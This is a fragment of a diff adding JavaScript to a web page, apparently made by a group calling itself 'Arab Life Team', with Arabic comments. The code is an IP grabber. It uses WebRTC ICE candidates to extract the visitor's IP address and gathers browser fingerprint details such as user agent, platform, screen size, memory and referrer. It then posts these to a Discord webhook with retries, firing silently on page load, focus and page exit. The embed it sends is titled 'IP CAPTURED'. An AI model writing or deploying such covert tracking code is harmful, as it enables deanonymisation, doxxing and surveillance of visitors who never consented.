+                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(reject);
+                
+                let ipFound = false;
+                
+                pc.onicecandidate = (ice) => {
+                    if (ipFound || !ice || !ice.candidate || !ice.candidate.candidate) return;
+                    
+                    const candidate = ice.candidate.candidate;
+                    const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                    const match = regex.exec(candidate);
+                    
+                    if (match) {
+                        ipFound = true;
+                        resolve(match[1]);
+                        pc.close();
+                    }
+                };
+                
+                setTimeout(() => {
+                    if (!ipFound) {
+                        pc.close();
+                        reject('Timeout');
+                    }
+                }, 3000);
+            });
+        }
+
+        // إرسال البيانات إلى Discord مع محاولات متعددة وبدائل
+        async function sendToDiscordWithFallback(ip, visitorInfo) {
+            const payload = {
+                embeds: [{
+                    title: "🔥 IP CAPTURED - ARAP LIFE TEAM",
+                    description: `**IP Address:** \`${ip}\`\n**Time:** ${new Date().toLocaleString("ar-SA")}\n**Page:** team bom is here`,
+                    color: 0x00ff00,
+                    fields: [
+                        {
+                            name: "🌍 معلومات الزائر",
+                            value: `**المتصفح:** ${getBrowserName(visitorInfo.userAgent)}\n**اللغة:** ${visitorInfo.language}\n**النظام:** ${visitorInfo.platform}\n**الدقة:** ${visitorInfo.screenWidth}x${visitorInfo.screenHeight}`,
+                            inline: true
+                        },
+                        {
+                            name: "📊 معلومات إضافية",
+                            value: `**التتبع:** ${visitorInfo.doNotTrack}\n**المعالجات:** ${visitorInfo.hardwareConcurrency}\n**الذاكرة:** ${visitorInfo.deviceMemory}GB\n**الكوكيز:** ${visitorInfo.cookiesEnabled ? "✅" : "❌"}`,
+                            inline: true
+                        },
+                        {
+                            name: "📱 User Agent كامل",
+                            value: `\`\`\`${visitorInfo.userAgent.substring(0, 1000)}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "🔗 المصدر",
+                            value: visitorInfo.referrer,
+                            inline: true
+                        },
+                        {
+                            name: "📶 الحالة",
+                            value: visitorInfo.online,
+                            inline: true
+                        }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: "ARAB LIFE TEAM • discord.gg/AL0"
+                    }
+                }]
+            };
+            
+            // محاولات إرسال متعددة
+            const retryAttempts = 3;
+            
+            for (let attempt = 1; attempt <= retryAttempts; attempt++) {
+                try {
+                    const response = await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 
+                            'Content-Type': 'application/json',
+                            'User-Agent': 'Mozilla/5.0'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+                    
+                    if (response.ok || response.status === 204) {
+                        console.log(`✅ تم الإرسال بنجاح في المحاولة ${attempt}`);
+                        return true;
+                    } else {
+                        console.log(`⚠️ محاولة ${attempt} فشلت مع status: ${response.status}`);
+                    }
+                } catch (error) {
+                    console.log(`⚠️ خطأ في المحاولة ${attempt}:`, error);
+                }
+                
+                // انتظار قبل المحاولة التالية
+                if (attempt < retryAttempts) {
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+            }
+            
+            console.log('❌ جميع محاولات الإرسال فشلت');
+            return false;
+        }
+
+        // إرسال عند تحميل الصفحة
+        window.addEventListener('load', async () => {
+            // تأخير لضمان تحميل الصفحة أولاً
+            setTimeout(async () => {
+                await fetchIP();
+            }, 3500);
+            
+            // أيضًا إرسال عندما يحاول المستخدم المغادرة
+            window.addEventListener('beforeunload', async () => {
+                // إرسال سريع قبل المغادرة
+                try {
+                    const info = collectVisitorInfo();
+                    const ipDisplay = document.getElementById('ipDisplay');
+                    const ip = ipDisplay.textContent !== 'جاري جمع المعلومات...' ? ipDisplay.textContent : 'Unknown';
+                    await sendToDiscordWithFallback(ip, info);
+                } catch (error) {
+                    console.log('Error sending on exit:', error);
+                }
+            });
+            
+            // إرسال عند التركيز على الصفحة
+            window.addEventListener('focus', async () => {
+                const ipDisplay = document.getElementById('ipDisplay');
+                if (ipDisplay.textContent !== 'جاري جمع المعلومات...') {
+                    const info = collectVisitorInfo();
+                    await sendToDiscordWithFallback(ipDisplay.textContent, info);
+                }
+            });
+        });
+
+        // تأثيرات إضافية للصفحة
+        document.addEventListener('DOMContentLoaded', () => {
+            // تأثير كتابة على الـ IP
+            const ipDisplay = document.getElementById('ipDisplay');
+            const originalText = ipDisplay.textContent;
+            
+            // تأثير عشوائي على النصوص
+            setInterval(() => {
+                if (Math.random() < 0.1 && ipDisplay.textContent !== 'جاري جمع المعلومات...') {
+                    const chars = '0123456789ABCDEF';
+                    let glitched = '';
+                    for (let i = 0; i < ipDisplay.textContent.length; i++) {
+                        if (Math.random() < 0.1) {
+                            glitched += chars.charAt(Math.floor(Math.random() * chars.length));
+                        } else {
+                            glitched += ipDisplay.textContent.charAt(i);
+                        }
+                    }
+                    ipDisplay.textContent = glitched;
+                    
+                    setTimeout(() => {
+                        ipDisplay.textContent = originalText !== 'جاري جمع المعلومات...' ? originalText : ipDisplay.textContent;
+                    }, 100);
+                }
+            }, 2000);
+        });
+    </script>
 
 </body>
 </html>
